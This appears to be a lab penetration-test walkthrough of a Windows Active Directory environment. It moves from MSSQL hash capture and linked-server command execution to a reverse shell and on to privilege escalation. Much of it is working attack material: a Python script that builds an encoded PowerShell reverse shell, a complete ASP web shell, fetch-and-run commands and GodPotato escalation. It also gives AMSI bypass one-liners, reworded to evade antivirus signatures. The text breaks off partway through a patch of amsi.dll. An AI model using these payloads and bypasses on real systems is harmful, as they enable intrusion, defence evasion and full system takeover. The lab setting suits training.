sudo responder --interface "eth1"

And then the command xp_dirtree can accept a UNC path which resolves into a SMB, which is an outgoing connection: 

xp_dirtree \\<local_ip>\anything
This will result in the hash of the user sql_svc being presented in responder!

docs.title: trusted links
docs.text:
... are forest to forest techniques for possible lateral movement. When executing enum_links with a high privileged user such as jon.snow or sql_svc, the following output may be observed: 

SRV_NAME                 SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE
----------------------   ----------------   -----------   ----------------------
BRAAVOS                  SQLNCLI                          braavos.essos.local

# ... and:

Linked Server            Local Login      Is Self Mapping   Remote Login
----------------------   --------------   ---------------   ------------
BRAAVOS                  NULL                           1   NULL
BRAAVOS                  NORTH\jon.snow                 0   sa
... meaning, a link to BRAAVOS is established, and the connection to it's sa user is possible using the account NORTH\jon.snow.

To execute commands on braavos, a session as jon.snow is required. The use_link command then makes use of this link to gain code execution on another server: 

use_link BRAAVOS

enable_xp_cmdshell

xp_cmdshell whoami

# output:

SQL >BRAAVOS (sa  dbo@master)> xp_cmdshell whoami
output
-------------
essos\sql_svc

docs.title: Shell
docs.text:
As command execution on MSSQL is achieved using xp_cmdshell, a more stable reverse shell can be started. To do so, the following python script takes command line arguments such as IP and port, and feeds them into a reverse-shell initiator for powershell. That payload is encoded in base64 and the command which is to be executed on the target is printed. 

#!/usr/bin/env python
import base64
import sys

if len(sys.argv) < 3:
  print('usage : %s ip port' % sys.argv[0])
  sys.exit(0)

payload="""
$c = New-Object System.Net.Sockets.TCPClient('%s',%s);
$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
};
$c.Close()
""" % (sys.argv[1], sys.argv[2])

byte = payload.encode('utf-16-le')
b64 = base64.b64encode(byte)
print("powershell -exec bypass -enc %s" % b64.decode())

It can be used like this: 

python3 ./payload.py <local_ip> <port>

# output:

powershell -exec bypass -enc <base64>

After setting up a nc listener with the flags -lvnp <port>, the following xp_cmdshell command returns a reverse shell as sql_svc on the listener: 

xp_cmdshell 'powershell -exec bypass -enc <base64>'

docs.title: 8   Privilege Escalation
docs.text:
Port 80 of CASTELBLACK (SRV02) there is a simple asp.net application running which allows you to upload files. The following basic asp.net web-shell may be uploaded for web-based OS-access: 

<%
Function getResult(theParam)
    Dim objSh, objResult
    Set objSh = CreateObject("WScript.Shell")
    Set objResult = objSh.exec(theParam)
    getResult = objResult.StdOut.ReadAll
end Function
%>
<HTML>
    <BODY>
        Enter command:
            <FORM action="" method="POST">
                <input type="text" name="param" size=45 value="<%= myValue %>">
                <input type="submit" value="Run">
            </FORM>
            <p>
        Result :
        <% 
        myValue = request("param")
        thisDir = getResult("cmd /c" & myValue)
        Response.Write(thisDir)
        %>
        </p>
        <br>
    </BODY>
</HTML>
It is then accessible via http://10.3.10.22/upload/webshell.asp.

To get a reverse shell from this scenario, it is possible to use the same technique as in part 7 of this journey. First, a powershell command is required which acts as a reverse-shell initiator. The previous python script can be used again for this. Afterwards, the listener can be started using nc: 

python3 payload.py <local_ip> <port>

nc -lvnp <port>

And lastly, the resulting powershell command can then be hard-coded within the asp.net web-shell (in request("<command>")), or it can be sent over using the intended functionality of the web-shell: 

curl -X POST -d "param=powershell+-exec+bypass+-enc+<base64_cmd>" http://10.3.10.22/upload/webshell.asp

When executing whoami /all command in the reverse shell, the output is pretty interesting: 

Privilege Name                Description
============================= =========================================
SeImpersonatePrivilege        Impersonate a client after authentication
This privilege means that the current user is allowed to impersonate (act as) a security token which belongs to another user. If you manage to get a process to connect to you which has high privileges, you essentially can execute commands as that privileged process. There are a few tools which automate the exploitation of forcing a high-privileged process to connect to you (e.g. endpoint you control), capturing its token and impersonating it.

docs.title: SeImpersonatePrivilege to Authority\system
docs.text:
A blog post explains different windows exploits (so called potatoes) leading to privilege escalation to the account Authority/System by abusing the SeImpersonatePrivilege. I have chosen the tool GodPotato tool for this job.

I visit the github and look at the releases. There, i can find 3 .exe files, GodPotato-NET2.exe, GodPotato-NET35.exe, and GodPotato-NET4.exe. These different numbers stand for the .NET version running on the target. I quickly find out which version is running on the target machine using this command in the reverse shell: 

[System.Environment]::Version
The output tells me that i need the GodPotato-NET4.exe: 
Major  Minor  Build  Revision
-----  -----  -----  --------
4      0      30319  42000

So, i simply wget the GodPotato-NET4.exe onto my local machine, and start a web server which offers it for download: 

python3 -m http.server <port>
On the target, i can download the executable into the C:\backups directory like this: 
wget -O test.exe http://<local-IP>:<port>/test.exe
And it worked! I can now use the executable to issue any powershell command which gets executed as the user nt authority\system (has higher privileges as Administrator): 
./test.exe -cmd "whoami"

docs.title: AMSI bypass
docs.text:
To test AMSI bypasses, the Windows defender must be active. This can be achieved by using the remote-desktop protocol on the server which hosts the web-service (CASTELBLACK), and by manually enabling it in Windows settings: 

xfreerdp3 /u:vagrant /p:vagrant /v:castelblack /cert:ignore

Within the remote desktop session, it is possible to verify that AMSI is active by loading a script into memory which is flagged as malicious (not saving it onto disk): 

iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-WireTap.ps1')

# output:

iex : At line:1 char:1
+ function Invoke-WireTap
+ -----------------------
This script contains malicious content and has been blocked by your antivirus software.

Many AMSI bypass-techniques can be found on this GitHub. There is also a website which can generate a obfuscated AMSI bypass one-liner. Public AMSI bypasses may be signed, which makes them easily recognizable by Windows Defender. To bypass signature checks, minor modifications can be made to the bypass scripts, which makes them unrecognizable again. Original AMSI bypass: 

Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
Modified AMSI bypass: 
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');

$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');

$z=$y.GetValue($null);

[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)

Bypassing windows AMSI may not be enough in some scenarios, as .NET AMSI will still kick in. Public AMSI-Bypasses only work for PowerShell scripts. To bypass .NET AMSI, the amsi.dll must be somehow circumvented.

To bypass Windows AMSI and .NET level AMSI, the following script can be loaded onto a attacker-controlled disk as dotnet_bypass.txt. It can be made available via an python web-server (python3 -m http.server <port>): 

# Patching amsi.dll AmsiScanBuffer by rasta-mouse
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@
